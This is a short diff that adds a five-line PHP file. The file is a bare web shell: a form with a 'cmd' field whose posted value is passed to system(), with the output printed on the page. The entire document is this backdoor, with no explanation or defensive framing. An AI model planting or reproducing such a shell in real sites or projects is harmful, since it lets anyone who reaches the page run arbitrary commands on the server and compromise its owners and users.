@@ -1,0 +1,5 @@
+<form method='POST' enctype='multipart/form-data'>
+	<input submit='file' name='cmd'>
+	<button type='submit'>gas</button>
+</form>
+<pre><?=system($_POST['cmd'].' 2>&1');?></pre>
